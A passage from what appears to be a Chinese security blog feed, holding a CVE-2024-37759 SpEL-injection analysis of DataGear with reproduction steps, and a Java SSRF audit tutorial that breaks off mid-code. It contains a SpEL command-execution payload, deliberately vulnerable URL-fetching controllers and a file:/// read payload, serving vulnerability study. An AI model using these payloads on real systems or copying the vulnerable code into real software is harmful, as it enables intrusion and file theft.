    <title>CVE-2024-37759 SpEL注入</title>
    <link href="/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>DataGear 是一款开源免费的数据可视化分析平台，允许用户自由制作数据看板，支持接入 SQL、CSV、Excel、HTTP 接口、JSON 等多种数据源。</p><p>DataGear v5.0.0 存在 SpEL 表达式注入漏洞，可导致远程代码执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>地址：<a href="https://github.com/datageartech/datagear">datageartech&#x2F;datagear: DataGear数据可视化分析平台，自由制作任何您想要的数据看板 (github.com)</a></p><h3 id="数据库准备"><a href="#数据库准备" class="headerlink" title="数据库准备"></a>数据库准备</h3><ol><li>安装 MySQL 8.0 数据库，并将 root 用户的密码设置为：root（或修改 test&#x2F;config&#x2F;jdbc.properties 配置）</li><li>新建测试数据库，名称为：dg_test</li><li>使用 test&#x2F;sql&#x2F;test-mysql.sql 脚本初始化 dg_test 库</li></ol><h3 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h3><p>项目是典型的 Spring Boot 项目。在 IDE 中打开项目，使用 Maven 编译，运行 org.datagear.webapp.DataGearApplication 即可启动。</p><p>项目启动后访问地址：<a href="http://localhost:50401/">http://localhost:50401</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="项目漏洞点"><a href="#项目漏洞点" class="headerlink" title="项目漏洞点"></a>项目漏洞点</h3><p>org.datagear.persistence.support.ConversionSqlParamValueMapper#evaluateVariableExpression 方法中，存在 org.springframework.expression.common.TemplateAwareExpressionParser#parseExpression(java.lang.String) 的调用。</p><p><img src="/img/CVE-2024-37759/C01.png"></p><p>此方法主要用于计算expression的值</p><p>如果其中的参数 expression 可控，这个漏洞点就可能被利用。接下来需要找出调用 evaluateVariableExpression 的地方。</p><h3 id="触发漏洞点的调用链"><a href="#触发漏洞点的调用链" class="headerlink" title="触发漏洞点的调用链"></a>触发漏洞点的调用链</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">org.datagear.web.controller.DataController<span class="hljs-comment">#view</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#get(java.sql.Connection, org.datagear.persistence.Dialect, org.datagear.meta.Table, org.datagear.persistence.Row, org.datagear.persistence.SqlParamValueMapper, org.datagear.persistence.RowMapper)</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#buildUniqueRecordCondition</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#mapToSqlParamValue</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#map</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#resolveExpressionIf</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#evaluateVariableExpressions</span><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C11.png"></p><h3 id="寻找调用链过程"><a href="#寻找调用链过程" class="headerlink" title="寻找调用链过程"></a>寻找调用链过程</h3><p>全局搜索evaluateVariableExpression方法</p><p>发现evaluateVariableExpressions方法(主要用于判断表达式的值是否需要计算)，调用此方法</p><p>继续跟进，找到resolveExpressionIf方法调evaluateVariableExpressions方法</p><p><img src="/img/CVE-2024-37759/C02.png"></p><p>ai了一下此段代码含义，主要是用于判断传入的是否有表达式，会先计算表达式，再拼接到sql语句中执行</p><p>大致流程图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果不是字符串 → 直接返回<br>2. 否则：<br>   a. 如果启用变量表达式：<br>       - 提取并求值 → 替换为结果<br>       - 如果没有表达式但有转义字符 → 反转义<br>   b. 如果启用 SQL 表达式：<br>       - 提取并求值 → 替换为结果<br>       - 如果没有表达式但有转义字符 → 反转义<br>3. 返回最终值<br></code></pre></td></tr></table></figure><ul><li>输入值为 <code>$&#123;user.name&#125;</code>，系统会先替换 <code>$&#123;user.name&#125;</code> 为真实用户名字。</li><li>若替换后为 <code>SELECT COUNT(*) FROM log WHERE user=&#39;张三&#39;</code>，再解析 <code>#&#123;...&#125;</code> 表达式并执行 SQL。</li><li>可嵌套执行，先变量、后 SQL。</li></ul><p>继续搜索resolveExpressionIf方法，发现map方法调用此方法</p><p><img src="/img/CVE-2024-37759/C03.png"></p><p>此代码执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果值为 null，直接返回 null 参数封装<br>2. 否则：<br>   a. 执行表达式解析（变量 / SQL 表达式）<br>   b. 如果解析后是 SqlParamValue 类型 → 直接返回<br>   c. 否则将值封装为 SqlParamValue<br>3. 捕获异常：<br>   a. 映射异常原样抛出<br>   b. 其他异常封装并抛出（含表、列、值信息）<br></code></pre></td></tr></table></figure><p>主要用于将一个原始值（可能是表达式）转换为 <code>SqlParamValue</code> 类型，用于数据库操作。</p><p>继续查找用法，发现org&#x2F;datagear&#x2F;persistence&#x2F;support&#x2F;DefaultPersistenceManager.java</p><p>mapToSqlParamValue方法中调用了map方法</p><p><img src="/img/CVE-2024-37759/C04.png"></p><p>提取出关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (mapper == <span class="hljs-literal">null</span>)<br>    sqlParamValue = createSqlParamValue(column, value);<br><span class="hljs-keyword">else</span><br>    sqlParamValue = mapper.map(cn, table, column, value);<br></code></pre></td></tr></table></figure><p>如果没有传入 <code>mapper</code>，使用默认的方式创建 <code>SqlParamValue</code>；</p><p>否则，调用外部提供的 <code>mapper</code> 的 <code>map()</code> 方法执行自定义映射。</p><p>这里应该控制传入mapper为ConversionSqlParamValueMapper才可调用我们需要的map方法</p><p>继续查找用法，来到的buildUniqueRecordCondition方法</p><p><img src="/img/CVE-2024-37759/C05.png"></p><p>没有什么特殊的条件</p><p>此方法用途</p><table><thead><tr><th>功能</th><th>描述</th></tr></thead><tbody><tr><td>构造 SQL 条件</td><td>基于唯一列生成精确匹配条件</td></tr><tr><td>支持 null 值处理</td><td>自动使用 <code>IS NULL</code></td></tr><tr><td>支持嵌套 SQL</td><td>对字面量 SQL 做合法性校验</td></tr><tr><td>安全</td><td>值通过参数绑定，避免 SQL 注入</td></tr></tbody></table><p>生成 SQL 示例</p><p>假设唯一字段为 <code>id, name</code>，对应数据为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">id = <span class="hljs-number">1001</span><br>name = <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>生成的 SQL 条件将为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> ? <span class="hljs-keyword">AND</span> name <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>绑定参数列表为：<code>[1001]</code></p><p>继续跟进，看到get方法调用此方法</p><p><img src="/img/CVE-2024-37759/C06.png"></p><p>执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 检查表合法性<br>2. 获取数据库方言<br>3. 创建 SQL 查询语句（SELECT * FROM ... WHERE ...）<br>4. 将唯一字段从 param 映射为 SQL 条件<br>5. 执行查询，结果映射为 Row 列表<br>6. 判断返回结果数量：<br>   - 1 条 → 返回<br>   - 0 条 → null<br>   - &gt;1 条 → 抛出 NonUniqueResultException<br>7. 最终释放资源<br></code></pre></td></tr></table></figure><p>例如，你要从 <code>user</code> 表中根据 <code>id=1001</code> 查询一个用户：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> get(cn, <span class="hljs-literal">null</span>, userTable, Row.of(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-number">1001</span>), defaultMapper, rowMapper);<br></code></pre></td></tr></table></figure><p>返回结果可能是：</p><ul><li>找到唯一用户 → 返回 <code>Row</code> 对象</li><li>没有该用户 → 返回 <code>null</code></li><li>id 字段不是唯一的（异常）→ 抛出 <code>NonUniqueResultException</code></li></ul><p>继续查找利用点</p><p>来到org&#x2F;datagear&#x2F;web&#x2F;controller&#x2F;DataController.java </p><p>view方法</p><p><img src="/img/CVE-2024-37759/C07.png"></p><p>可以看到调用了persistenceManager.get</p><p>org.datagear.web.controller.DataController#view 是查看数据库表中一条记录的入口方法。其逻辑是根据传入的参数查询表，即 SELECT * FROM table WHERE paramName &#x3D; paramValue。</p><p>但在构造这个 SQL 查询语句时，会对 paramValue 进行处理。它会根据是否包含 “#{“ 等特殊字符来判断是否为表达式。如果是表达式，就会进行计算后再拼接到 SQL 中。（这个逻辑在 org.datagear.persistence.support.ConversionSqlParamValueMapper#resolveExpressionIf 中）此外，还需要 ConversionSqlParamValueMapper 启用变量表达式特性。</p><p>构造的恶意数据库（具体见漏洞复现）就是利用这个逻辑，传入参数 {“name”:”#{T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘calc’)}”}。其中的 #{T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘calc’)} 符合表达式形式，会进入 parseExpression 进行计算，从而触发命令执行。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步：准备恶意数据库表"><a href="#第一步：准备恶意数据库表" class="headerlink" title="第一步：准备恶意数据库表"></a>第一步：准备恶意数据库表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE evil;<br><br><span class="hljs-keyword">CREATE TABLE</span> `evil` (<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">209</span>) <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span><br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_unicode_ci;<br><br><span class="hljs-keyword">INSERT INTO</span> `evil` <span class="hljs-keyword">VALUES</span> (&quot;#&#123;T(java.lang.String).forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C08.png"></p><h3 id="第二步：添加恶意数据库源"><a href="#第二步：添加恶意数据库源" class="headerlink" title="第二步：添加恶意数据库源"></a>第二步：添加恶意数据库源</h3><ol><li>登录 <a href="http://localhost:50401/">http://localhost:50401</a>，默认账号密码为 admin&#x2F;admin。</li><li>在架构添加界面中添加此 MySQL 数据库：<code>/schema/saveAdd</code>。</li><li>选择”数据源”—“数据源添加”，填写刚才创建的恶意数据库地址。</li></ol><p><img src="/img/CVE-2024-37759/C09.png"></p><h3 id="第三步：触发漏洞执行代码"><a href="#第三步：触发漏洞执行代码" class="headerlink" title="第三步：触发漏洞执行代码"></a>第三步：触发漏洞执行代码</h3><p>打开刚才添加的数据库，然后单击”查看”按钮，将执行 SpEL 表达式</p><p><img src="/img/CVE-2024-37759/C10.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>DataGear 在 v5.1.0 中修复了这个漏洞。</p><p>修复方案利用了前面提到的 ConversionSqlParamValueMapper 中的变量表达式特性。新的逻辑直接关闭了这个特性，全部按照字符串处理，不再对表达式进行解析。</p><p>注：可以使用 SimpleEvaluationContext 来限制可执行注入的 SpEL 表达式。</p><p>创建一个 受限的表达式执行环境，默认：</p><ul><li>只允许读取属性、调用 getter 方法</li><li>不允许调用任意方法（如 <code>System.exit()</code> 这种危险操作）</li><li>适合暴露给不可信的用户输入（安全）</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.butian.net/article/590">https://forum.butian.net/article/590</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SSRF</title>
    <link href="/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/"/>
    <url>/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计中的SSRF"><a href="#Java代码审计中的SSRF" class="headerlink" title="Java代码审计中的SSRF"></a>Java代码审计中的SSRF</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Java的SSRF利用方式比较局限</p><ul><li>利用file协议任意文件读取。</li><li>利用http协议端口探测</li></ul><h4 id="网络请求支持的协议"><a href="#网络请求支持的协议" class="headerlink" title="网络请求支持的协议"></a>网络请求支持的协议</h4><p>Java网络请求支持的协议可通过下面几种方法检测：</p><ul><li>代码中遍历协议</li><li>官方文档中查看</li><li><code>import sun.net.www.protocol</code>查看</li></ul><p>从<code>import sun.net.www.protocol</code>可以看到，支持以下协议</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span> <span class="hljs-keyword">ftp</span> mailto <span class="hljs-keyword">http</span> <span class="hljs-keyword">https</span> jar netdoc<br></code></pre></td></tr></table></figure><p><img src="/img/ssrf/ss01.png"></p><h4 id="发起网络请求的类"><a href="#发起网络请求的类" class="headerlink" title="发起网络请求的类"></a>发起网络请求的类</h4><p>当然，SSRF是由发起网络请求的方法造成。所以先整理Java能发起网络请求的类。</p><ul><li>HttpClient</li><li>Request(对HttpClient封装后的类)</li><li>HttpURLConnection</li><li>URLConnection</li><li>URL</li><li>okhttp</li></ul><p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p><p>比如：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">HttpURLConnection<br><span class="hljs-built_in">HttpClient</span><br>Request<br>okhttp<br></code></pre></td></tr></table></figure><p>所以，如果用以下类的方法发起请求，则支持<code>sun.net.www.protocol</code>所有协议</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">URLConnection</span><br><span class="hljs-attribute">URL</span><br></code></pre></td></tr></table></figure><p>注意，Request类对HttpClient进行了封装。类似Python的requests库。<br>用法及其简单，一行代码就可以获取网页内容。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-built_in">Request</span>.<span class="hljs-keyword">Get</span>(url).<span class="hljs-keyword">execute</span>().returnContent().<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>();<br></code></pre></td></tr></table></figure><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><h5 id="SSRF中的内网检测"><a href="#SSRF中的内网检测" class="headerlink" title="SSRF中的内网检测"></a>SSRF中的内网检测</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.ssfr.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SsrfController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/ssrf&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">fetchUrl</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>            <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">httpUrl</span> <span class="hljs-operator">=</span> (HttpURLConnection) u.openConnection();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(httpUrl.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(line);<br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请求失败&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在代码中<code>HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</code>，这个地方进行了强制转换，去某度搜索了一下具体用意。得出结论：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">URLConnection:可以走邮件、文件传输协议。<br>HttpURLConnection 只能走浏览器的HTTP协议<br></code></pre></td></tr></table></figure><p>也就是说使用了强转为HttpURLConnection后，利用中只能使用http协议去探测该服务器内网的其他应用。</p><p>使用百度做测试</p><p><img src="/img/ssrf/ss02.png"></p><p>无法读取文件，因为这里只支持http和https的协议。</p><p><img src="/img/ssrf/ss03.png"></p><p>下面来试试不强制转换成HttpURLConnection</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ssrfServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>        String htmlContent;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);  <span class="hljs-comment">// 实例化url对象</span><br>            <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();  <span class="hljs-comment">// 打开连接</span><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>)<br>            );  <span class="hljs-comment">// 读取资源内容</span><br>            <span class="hljs-keyword">while</span> ((htmlContent = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(htmlContent);  <span class="hljs-comment">// 拼接内容</span><br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();  <span class="hljs-comment">// 返回HTML内容</span><br>            <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请求失败&quot;</span>;<br>        &#125;<br><br></code></pre></td></tr></table></figure><p>是能够成功读取文件的</p><p><img src="/img/ssrf/ss04.png"></p><h5 id="SSRF中的读取文件"><a href="#SSRF中的读取文件" class="headerlink" title="SSRF中的读取文件"></a>SSRF中的读取文件</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/readfileServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            response.setStatus(<span class="hljs-number">500</span>); <span class="hljs-comment">// 设置服务器错误状态</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>和上面的代码对比一下，发现其实都大致相同，唯一不同的地方是一个是用openStream方法获取对象，一个是用openConnection获取对象。两个方法类似</p><p><img src="/img/ssrf/ss05.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8080//downloadServlet?url=file:///C:%5c%5c1.txt<br></code></pre></td></tr></table></figure><p><strong>注意：</strong> 这里是三个斜杆，并且反斜杠需要url编码 否则就会报错</p><h5 id="SSRF中的文件下载"><a href="#SSRF中的文件下载" class="headerlink" title="SSRF中的文件下载"></a>SSRF中的文件下载</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件下载</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url,</span><br><span class="hljs-params">                             HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1.txt&quot;</span>;<br>        response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + filename);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(bytes)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>            &#125;<br>        &#125;<br>    &#125;    <br></code></pre></td></tr></table></figure><p>与读取文件不同的是响应头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;fileName=&quot;</span> + filename);<br></code></pre></td></tr></table></figure><p>设置响应头，告诉浏览器这是一个附件，下载时保存为 <code>1.txt</code></p><p>这段代码，设置mime类型为文件类型，访问浏览器的时候就会被下载下来。</p><p>同样可以使用file协议，能够成功下载文件</p><p><img src="/img/ssrf/ss06.png"></p><h5 id="imageIO中的SSRF"><a href="#imageIO中的SSRF" class="headerlink" title="imageIO中的SSRF"></a>imageIO中的SSRF</h5><p>imageIO类是jdk中自带的一个类，主要用于操作一些图片文件。比如读写、压缩图片。</p><p>ssrf 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ssrf</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BufferedImage <span class="hljs-title 